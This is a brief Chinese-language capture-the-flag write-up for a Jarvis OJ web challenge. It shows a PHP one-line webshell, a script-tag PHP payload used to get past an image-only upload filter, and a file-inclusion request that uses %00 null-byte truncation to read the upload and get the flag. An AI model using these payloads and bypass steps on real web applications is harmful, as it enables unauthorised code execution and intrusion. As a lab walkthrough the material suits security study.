    “没有什么防护是一个漏洞解决不了的，如果有，那就…..”

    打开目标网页，一个考点应该为上传绕过。首先上传普通一句话木马。

    <?php @eval(['123']);?>

    提示’上传照片只能是JPG或者GIF！’
    重新构造上传数据包。POST内容为


    更改一句话木马内容：<script language="php">phpinfo();</script>

    显示了图片id。
    然后找到了图片的真实地址。http://web.jarvisoj.com:32785/uploads/1562642456.gif
    直接访问不能得到flag。
    想起题目信息"没有什么防护是一个漏洞解决不了的，如果有，那就....."
    构造任意文件读取，访问http://web.jarvisoj.com:32785/index.php?page=uploads/1562642456.gif

    回显Warning: fopen(uploads/1562642456.gif.php): failed to open stream: No such file or directory in /opt/lampp/htdocs/index.php on line 24 No such file! 网页自动在562642456.gif后添加了.php

    使用%00截断:http://web.jarvisoj.com:32785/index.php?page=uploads/1562642456.gif%00得到flag。
